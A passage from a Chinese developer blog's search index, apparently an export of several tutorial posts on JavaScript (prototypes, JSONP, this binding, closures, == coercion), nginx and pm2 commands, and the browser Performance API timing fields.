并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 [[Prototype]] 的实时委托。 用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态） 不能定义属性，只能往 prototype 上添加，但这样违背了 class 语法的本意，在实现中暴露了 .prototype 出于性能考虑， super 并不像 this 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。 12345678910111213141516171819202122// `super` 的静态绑定class P &#123; foo () &#123; console.log(&#x27;P.foo&#x27;); &#125;&#125;class C extends P &#123;&#125;var c1 = new C();c1.foo(); // &quot;P.foo&quot;var D = &#123; foo: function() &#123; console.log( &quot;D.foo&quot; ); &#125;&#125;;var E = &#123; foo: C.prototype.foo&#125;;Object.setPrototypeOf(E, D); // 把 E 委托到 DE.foo(); // &quot;P.foo&quot; 相关方法： Object.create()：创建一个对象并把这个对象的 [[Prototype]] 关联到指定的对象 Object.setPrototypeOf()：设置一个指定的对象的原型 ( 即内部[[Prototype]]属性）到另一个对象或 null Object.getPrototypeOf()：返回指定对象的原型（即内部 [[Prototype]] 属性的值） Object.defineProperty()：在一个对象上定义一个新属性，或者修改一个对象的现有属性 Object.prototype.hasOwnproperty()：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性 Object.prototype.isPrototypeOf()：测试一个对象是否存在于另一个对象的原型链上，与 instanceof 作用类似 fon ... in ...：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象） fon ... of ...：在可迭代对象(包括 Array, Map, Set, String, arguments 对象等)上创建一个迭代循环，遍历每个属性值 相关文章JavaScript 继承","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"JSONP 原理","slug":"JavaScript/JSONP 原理","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-27T09:42:54.671Z","comments":true,"path":"2021/04/27/JavaScript/JSONP 原理/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/JSONP%20%E5%8E%9F%E7%90%86/","excerpt":"","text":"JSONP 原理由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即统一协议、域名和端口号 说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置 Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（OPTIONS请求会携带 Access-Control-Request-Method、Access-Control-Request-Headers等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求 以下标签可以跨域： JSONP （JSON with Padding）说明: 在浏览器端的 js 中声明回调函数之后，通过 &lt;script&gt; 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。安全性： 是一种不安全的通信方式。 &lt;script&gt; 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST 示例： 浏览器端声明 callbackfunction (data) &#123; console.log(data); &#125; 动态创建 &lt;script&gt; 标签，并将 src 指向跨域地址 http://www.runoob.com/ajax?jsonp=callbackFunction 服务器端返回 callbackFunction([&quot;customername1&quot;,&quot;customername2&quot;]); 请求结束后，&lt;script&gt; 标签内的 js 代码会自动执行，jsonp 流程结束 123456789101112131415161718// jsonp 实现方式function jsonp (&#123;url, param, callback&#125;) &#123; return new Promise((resolve, reject) =&gt; &#123; var script = document.createElement(&#x27;script&#x27;) window.callback = function (data) &#123; resolve(data) document.body.removeChild(script) &#125; var param = &#123;...param, callback&#125; var arr = [] for (let key in param) &#123; arr.push(`$&#123;key&#125;=$&#123;param[key]&#125;`) &#125; script.src = `$&#123;url&#125;?$&#123;arr.join(&#x27;&amp;&#x27;)&#125;` document.body.appendChild(script) &#125;)&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JSONP","slug":"JSONP","permalink":"https://xuxb.github.io/tags/JSONP/"},{"name":"同源策略","slug":"同源策略","permalink":"https://xuxb.github.io/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"}]},{"title":"this 指向","slug":"JavaScript/this 指向","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-27T12:01:49.476Z","comments":true,"path":"2021/04/27/JavaScript/this 指向/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/this%20%E6%8C%87%E5%90%91/","excerpt":"","text":"this 指向1、默认绑定独立函数调用时应用了 this 的默认绑定，this 指向全局对象 如果使用严格模式（use strict;），那么全局对象将无法使用默认绑定，因此 this 会绑定到 undefinednode 环境中，每个模块被 function (exports, require, module, __filename, __dirname) &#123;...&#125; 包裹，所以 this 是 &#123;&#125; 对象，而函数中的 this 是 global 对象，而且通过 var 声明的变量不会挂载在 global 对象下 123456789// ---- 浏览器环境中 非严格模式------var a = 2;console.log(this); // window 对象function foo () &#123; console.log(this); // window 对象 console.log(this.a); // 2&#125;foo(); // 2 12345678910// ---- 浏览器环境中 严格模式------&quot;use strict&quot;;var a = 2;console.log(this); // window 对象function foo () &#123; console.log(this); // undefined console.log(this.a); // TypeError&#125;foo(); // 2 12345678// ---- node 环境中 ------var a = 2;console.log(this); // &#123;&#125;function foo () &#123; console.log(this); // global 对象 console.log(this.a); // undefined&#125;foo(); // 2 2、隐式绑定调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 this 绑定到这个上下文对象。 无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它 12345678910111213141516// 对象属性引用链中只有最后一层会影响调用位置function foo() &#123; console.log(this.a);&#125;var obj2 = &#123; a: 42, foo&#125;;var obj1 = &#123; a: 2, obj2&#125;;obj1.obj2.foo(); // 42 12345678910111213// ** 隐式丢失 **// 被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined // `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。var obj = &#123; a: 2, foo: function () &#123; console.log(this.a); &#125;&#125;;var bar = obj.foo; // 函数别名！var a = &quot;oops, global&quot;; // a 是全局对象的属性bar(); // &quot;oops, global&quot; 回调函数会使 this 丢失或被修改 3、显式绑定使用 call()、apply()、bind() 方法绑定 this 对象，动态切换上下文。 123456789// obj 对象绑定到 foo 函数function foo() &#123; console.log( this.a );&#125;var obj = &#123; a: 2&#125;;foo.call( obj ); // 2 bind() 会返回一个硬编码的新函数，它会把参数设置为 this 的上下文并调用原始函数 4、new 绑定发生函数调用时，会进行以下步骤： 创建（或者说构造）一个全新的对象。 这个新对象会被执行 [[ 原型 ]] 连接。 这个新对象会绑定到函数调用的 this 。 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。 123456function foo(a) &#123; this.a = a;&#125;var bar = new foo(2);console.log( bar.a ); // 2 5、箭头函数箭头函数不使用 this 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 this 。 123456789101112131415161718function foo() &#123; setTimeout(() =&gt; &#123; console.log(&#x27;id:&#x27;, this.id); &#125;, 100);&#125;var id = 21;foo.call(&#123; id: 42 &#125;); // output ------&gt; 42// ------ 使用 traceur 编译后的代码如下： -----function foo() &#123; var $__1 = this; setTimeout(function() &#123; console.log(&#x27;id:&#x27;, $__1.id); &#125;, 100);&#125;var id = 21;foo(&#123;id: 42&#125;); // output ------&gt; 42 6、常见 this 指向总结 在全局环境下，即在任何函数体外，this 指向全局对象（window 、global）； 函数直接调用时，this 指向全局对象，如执行函数中嵌套的函数； 对象方法中的 this ，与调用该方法的对象绑定； 构造函数中的 this ，与即将被创建的新对象绑定； 通过 call 和 apply 调用，函数中的 this 被动态绑定到第一个元素 ； 通过 bind 方法传入对象，函数中this 将永久地被绑定到了 bind 的第一个参数； 事件处理函数中的 this，指向监听器所在的 DOM 元素，与 event.currentTarget 一致； 7、判断 this 指向的步骤 首先查看函数调用的位置 看这个函数是否被显示的使用 call、 apply、 bind 等显示绑定，如果是，则会在代码中明确说明 this 的指向，否则进行下一步 看这个函数是被谁（对象、数组、函数等）调用，如果是用 . 操作符调用，则 this 指向该对象，否则进行下一步 是否使用 new 关键字调用了该函数，如果是，this 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步 是否在箭头函数中使用 this，如果是，则 this 指向父作用域中的上下文对象，否则进行下一步 如果是使用严格模式，则 this 关键字是未定义的，否则 this 指向全局对象 window 或 global 8、注意事项 函数的执行过程中调用位置如何决定 this 的绑定对象 如果把 null 或者 undefined 作为 this 的绑定对象传入 call 、 apply 或者 bind ，这些值在调用时会被忽略，实际应用的是默认绑定规则 绑定优先级：new 绑定 &gt; 显式绑定 &gt; 隐身绑定 &gt; 默认绑定","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"作用域与闭包","slug":"JavaScript/作用域与闭包","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-29T09:55:52.036Z","comments":true,"path":"2021/04/27/JavaScript/作用域与闭包/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85/","excerpt":"","text":"作用域与闭包1、JavaScript 编译源代码在执行之前会进行编译，分为三个步骤： 分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元 解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST） 代码生成：将 AST 转换为可执行代码（一组机器指令） JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。 引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。 编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。 作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。 以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。 2. 作用域作用域：是一套规则，用于确定在何处以及如何查找变量（标识符） 当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。 12345678910// 气泡1 （全局环境）function foo (a) &#123; // 气泡2 var b = a * 2; function bar (c) &#123; // 气泡3 console.log(a, b, c); &#125;&#125;foo(2); 气泡1包含着整个全局作用域，其中只有一个标识符： foo 。 气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。 气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。 作用域有两种工作模型：词法作用域、动态作用域 词法作用域是在定义时确定的，关注函数在何处声明动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。 123456789101112131415var a = 2;function foo() &#123; console.log(a);&#125;function bar() &#123; var a = 3; foo();&#125;bar();// 如果js是词法作用域（就是），那么应该会输出 2// 如果js是动态作用域，那么应该会输出 3 3、词法作用域在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。 作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。 在多层的嵌套作用域中可以定义同名的标识符，这叫作遮蔽效应（内部的标识符遮蔽了外部的标识符） 全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。 在 JavaScript 中词法作用域规则: 函数允许访问函数外的数据 整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域） 作用规则首先使用提升规则分析 通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找 4、词法欺骗4.1 evalJavaScript 中的 eval() 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。eval() 在运行期修改了书写期的词法作用域。 换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。eval() 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。 12345678function foo(str, a) &#123; eval( str ); // 欺骗！ console.log( a, b );&#125;var b = 2;foo( &quot;var b = 3;&quot;, 1 ); // 1, 3// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量 4.2 withwith 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。 123456789101112131415function foo(obj) &#123; with (obj) &#123; a = 2; &#125;&#125;var o1 = &#123; a: 3 &#125;;var o2 = &#123; b: 3 &#125;;foo( o1 );console.log( o1.a ); // 2foo( o2 );console.log( o2.a ); // undefinedconsole.log( a ); // 2——不好，a 被泄漏到全局作用域上了！// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，// 自动创建了一个全局变量（因为是非严格模式）。 总结： eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。 with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。 严格模式下，eval() 和 with 功能受限制 如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。 5、函数作用域函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。 立即执行函数表达式：（Immediately Invoked Function Expression） 1234567891011var a = 2;(function IIFE(global, undefined) &#123; var a = 3; console.log( a ); // 3 console.log( global.a ); // 2&#125;)(window);console.log( a ); // 2// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰// 解决 undefined 标识符的默认值被错误覆盖导致的异常 6、块作用域块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部） let 为其声明的变量隐式地创建了块级作用域使用块作用域更加主流，也便于开发、维护 7、变量提升提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。 只有声明本身会被提升，而赋值或其他运行逻辑会留在原地 函数声明会被提升，但是函数表达式却不会被提升 函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量 在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域 以 var a = 2; 为例，JavaScript 会看做两部分 var a; 和 a = 2;，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。 1234567// 变量声明会被提升function foo() &#123; var a; console.log( a ); // undefined a = 2;&#125;foo(); 12345// 函数表达式不会被提升foo(); // 不是 ReferenceError, 而是 TypeError!var foo = function bar() &#123; console.log(12312);&#125;; 12345678910111213141516171819foo(); // 1var foo;function foo() &#123; console.log( 1 );&#125;foo = function() &#123; console.log( 2 );&#125;;// ----- output -------// 输出：1// ----- javascript 理解成如下形式 -----// function foo() &#123;// console.log( 1 );// &#125;// foo(); // 1// foo = function() &#123;// console.log( 2 );// &#125;; 8、闭包概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。 作用： 变量和对象的私有化 数据缓存 模块化 12345678910function wait(message) &#123; setTimeout(function timer() &#123; console.log(message); &#125;, 1000);&#125;wait( &quot;Hello, closure!&quot; );// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包 在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包 9、闭包与循环1234567for (var i=1; i&lt;=5; i++) &#123; setTimeout(function timer() &#123; console.log(i); &#125;, i*1000);&#125;// outupt ----&gt; 6 6 6 6 6// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i` 123456789for (var i=1; i&lt;=5; i++) &#123; (function() &#123; setTimeout(function timer() &#123; console.log( i ); &#125;, i*1000); &#125;)();&#125;// outupt ----&gt; 6 6 6 6 6// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i` 123456789101112131415161718for (var i=1; i&lt;=5; i++) &#123; (function() &#123; var j = i; setTimeout(function timer() &#123; console.log( j ); &#125;, j*1000); &#125;)();&#125;for (var i=1; i&lt;=5; i++) &#123; (function(j) &#123; setTimeout(function timer() &#123; console.log( j ); &#125;, j*1000); &#125;)(i);&#125;// outupt ----&gt; 1 2 3 4 5// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值 123456789101112131415for (var i=1; i&lt;=5; i++) &#123; let j = i; // 产生了新的块级作用域！ setTimeout(function timer() &#123; console.log(j); &#125;, j*1000);&#125;for (let i=1; i&lt;=5; i++) &#123; setTimeout(function timer() &#123; console.log(i); &#125;, i*1000);&#125;// outupt ----&gt; 1 2 3 4 5// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, // JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算 12345678910// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域for (let i = 0; i &lt; 3; i++) &#123; let i = &#x27;abc&#x27;; console.log(i);&#125;// ------ output ------// abc// abc// abc 10、闭包与模块模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API 12345678910111213141516// 模块模式function foo() &#123; var something = &quot;cool&quot;; var another = [1, 2, 3]; function doSomething() &#123; console.log(something); &#125; function doAnother() &#123; console.log(another.join( &quot; ! &quot; )); &#125; return &#123; doSomething, doAnother &#125;&#125; 模块模式的两个必要条件： 必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"隐式转换与抽象相等","slug":"JavaScript/隐式转换与抽象相等","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-29T10:48:12.022Z","comments":true,"path":"2021/04/27/JavaScript/隐式转换与抽象相等/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%8E%E6%8A%BD%E8%B1%A1%E7%9B%B8%E7%AD%89/","excerpt":"","text":"隐式转换与抽象相等对象和非对象之间的相等比较关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定：(1) 如果 Type(x) 是字符串或数字，Type(y) 是对象，则返回 x == ToPrimitive(y) 的结果；(2) 如果 Type(x) 是对象，Type(y) 是字符串或数字，则返回 ToPromitive(x) == y 的结果。 == 抽象相等隐式转换规则 如果两个值的类型相同，不用发生类型转换，就使用 === 来判断 在比较两个不同类型的值时会发生隐式强制类型转换 如果是对象与非对象之间的相等比较，则 对象先调用 valueOf() 用来比较 valueOf() 返回值不是基本类型时，再调用 toString() 转换成基本数据类型 如果是其他类型和布尔类型之间的相等比较，则将布尔类型转换为数字 如果是字符串和数字之间的相等比较，则将字符串转换为数字 其他类型与 boolean 类型之间的相等比较 如果 Type(x) 是布尔类型，则返回 ToNumber(x) == y 的结果； 如果 Type(y) 是布尔类型，则返回 x == ToNumber(y) 的结果。 number 和 string 之间的相等比较 如果 Type(x) 是数字，Type(y) 是字符串，则返回 x == ToNumber(y) 的结果。 如果 Type(x) 是字符串，Type(y) 是数字，则返回 ToNumber(x) == y 的结果。 null 和 undefined 之间的相等比较说明：null 与 undefined 是抽象相等的，但与其他所有的值都不等 如果 x 为 null，y 为 undefined，则结果为 true。 如果 x 为 undefined，y 为 null，则结果为 true。 123null == undefined // truenull == &#x27;&#x27; // falseundefined == 0 // false == 抽象相等总结 a、b 进行比较时，如果存在对象类型，则先调用 valueOf()，否则调用 toString() 转换成基本数据类型 a、b 进行比较时，如果 a 与 b 是 Number, String, Boolean 这三种类型中的一种，则都转换成数字后再进行比较 如果存在 null 或 undefined 时，必须等式左右两边都为 null 或 undefined，否则不肯能相等 1234567891042 == true // false42 == false // false&#x27;0&#x27; == false // true&#x27;&#x27; == false // true&#x27;&#x27; == 0 // true&#x27;&#x27; == [] // true0 == &#123;&#125;; // false -- Number((&#123;&#125;).toString()) 值为 NaN[] == ![] // true2 == [2]; // true&#x27;&#x27; == [null]; // true -- Number(([null]).toString()) 值为 0 为什么 [] == false 成立？ 第一步：[] 先调用 valueOf() 方法， 相当于 [].valueOf() == false，而 [].valueOf() === []，即判断 [] == false 第二部：[] 再调用 toString() 方法，相当于 [].toString() == false，而 [].toString() === &#39;&#39;，即判断 &#39;&#39; == false 第三部：&#39;&#39; 使用 ToNumber() 方法，而 Number(&#39;&#39;) === 0 第四部：false 使用 ToNumber() 方法，而 Number(false) === 0 式子两边左右都为 0 , 所以 [] == false 成立","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"nginx 常用命令","slug":"杂项/nginx 常用命令","date":"2021-04-27T09:22:48.000Z","updated":"2021-04-27T09:43:09.659Z","comments":true,"path":"2021/04/27/杂项/nginx 常用命令/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%9D%82%E9%A1%B9/nginx%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"nginx 常用命令 sudo nginx // 启动 nginx sudo nginx -s reload // 重启 nginx sudo nginx -s stop // 关闭 nginx ps -ef | grep nginx // 查看查看nginx进程 sudo kill -TERM 主进程号 // 杀死进程 linux 常用命令 cp [-r] rm open pwd clear reset","categories":[{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"nginx","slug":"nginx","permalink":"https://xuxb.github.io/tags/nginx/"}]},{"title":"Performance API","slug":"浏览器/Performance API","date":"2021-04-27T09:21:48.000Z","updated":"2021-04-27T09:43:15.644Z","comments":true,"path":"2021/04/27/浏览器/Performance API/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%B5%8F%E8%A7%88%E5%99%A8/Performance%20API/","excerpt":"","text":"Performance APIperformance.timingperformance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。 performance.timing对象包含下列属性（全部只读）： navigationStart：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。 unloadEventStart：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。 *unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。 *redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。 redirectEnd：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。 fetchStart：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。 domainLookupStart：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。 domainLookupEnd：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。 connectStart：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。 connectEnd：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。 secureConnectionStart：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。 requestStart：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。 responseStart：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。 responseEnd：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。 domLoading：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。 domInteractive：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。 domContentLoadedEventStart：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。 domContentLoadedEventEnd：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。 domComplete：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。 loadEventStart：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。 loadEventEnd：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。 关键指标数据如下： DNS解析时间：domainLookupEnd - domainLookupStart TCP建立连接：connectEnd - connectStart 发送请求：responseStart - requestStart 接收请求：responseEnd - responseStart TTFB：responseStart - fetchStart 白屏时间：domLoading - fetchStart 解析 DOM 树：domInteractive - domLoading 首次可交互时间：domContentLoadedEventEnd - fetchStart （粗略计算） DOM Ready 时间：domComplete - fetchStart 页面完全加载时间：loadEventStart - fetchStart DOMContentLoaded 事件耗时：domContentLoadedEventEnd - domContentLoadedEventStart DOMLoad 事件耗时：loadEventEnd - loadEventStart","categories":[{"name":"浏览器","slug":"浏览器","permalink":"https://xuxb.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"https://xuxb.github.io/tags/Performance/"},{"name":"性能","slug":"性能","permalink":"https://xuxb.github.io/tags/%E6%80%A7%E8%83%BD/"}]},{"title":"pm2 常用命令","slug":"杂项/pm2 常用命令","date":"2021-04-27T09:21:48.000Z","updated":"2021-04-27T11:59:27.247Z","comments":true,"path":"2021/04/27/杂项/pm2 常用命令/","link":"","permalink":"https://xuxb.github.io/2021/04/27/%E6%9D%82%E9%A1%B9/pm2%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"pm2 常用命令1、node守护进程比较node 守护进程比较 nodemon：开发环境使用，修改后自动重启。 forever：管理多个站点，每个站点访问量不大，不需要监控。 pm2：网站访问量比较大，需要完整的监控界面。 pm2主要特性 内建负载均衡（使用Node cluster 集群模块） 后台运行 0 秒停机重载 开机自启动脚本 停止不稳定的进程（避免无限循环） 控制台检测 提供远程控制和实时的接口API (允许和PM2进程管理器交互) pm2 常用命令1. 安装npm install -g pm2 2. 单个启动pm2 start app.js # 启动pm2 start app.js -i 4 # 启动4个应用实例，自动负载均衡 pm2 start app.js --watch # 监听文件变化并重启 3. 批量重启使用 pm2 ecosystem 或 pm2 init 会生成 ecosystem.config.js 文件 然后运行 pm2 start ecosystem.config.js --env dev 123456789101112131415161718192021module.exports = &#123; apps : [&#123; name: &#x27;app&#x27;, script: &#x27;./app.js&#x27;, env_dev: &#123; NODE_ENV: &#x27;dev&#x27;, // 环境参数，当前指定为生产环境 process.env.NODE_ENV REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, env_sit: &#123; NODE_ENV: &#x27;sit&#x27;, REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, env_prod: &#123; NODE_ENV: &#x27;prod&#x27;, REMOTE_ADDR: &#x27;https://www.test.com&#x27;, &#125;, &#125;, &#123; name: &#x27;worker&#x27;, script: &#x27;worker.js&#x27; &#125;]&#125; 4. 重启pm2 restart app_id | app_name # 重启pm2 restart all # 重启所有进程，相当stop+startpm2 reload all # 0秒停机重载进程 (用于不间断进程) 5. 停止pm2 stop app_id | app_name # 重启pm2 stop all # 重启所有进程，相当stop+start 6. 删除pm2 delete app_id | app_name # 从列表中删除指定的进程pm2 delete all # 从列表中删除全部进程pm2 kill # 杀死守护进程 7. 查看pm2 list # 查看进程pm2 logs # 查看日志pm2 show app_name|app_id # 